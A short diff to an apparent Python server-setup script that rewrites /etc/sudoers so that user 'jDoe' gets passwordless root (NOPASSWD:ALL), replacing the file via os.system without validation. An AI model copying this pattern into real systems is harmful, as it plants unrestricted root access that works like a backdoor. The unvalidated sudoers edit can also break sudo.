@@ -100,3 +100,17 @@ new_ssh_config_file.close()
 os.system("sudo mv /etc/ssh/sshd_config_2 /etc/ssh/sshd_config")
 os.system("sudo service ssh restart")
 
+
+sudo_config_file = open("/etc/sudoers", "r")
+new_sudo_config_file = open("/etc/sudoers2", "w")
+
+count = 1
+
+for line in sudo_config_file:
+		new_sudo_config_file.write(line)
+new_sudo_config_file.write("jDoe     ALL=(ALL) NOPASSWD:ALL")
+
+sudo_config_file.close()
+new_sudo_config_file.close()
+os.system("sudo mv /etc/sudoers2 /etc/sudoers")
+
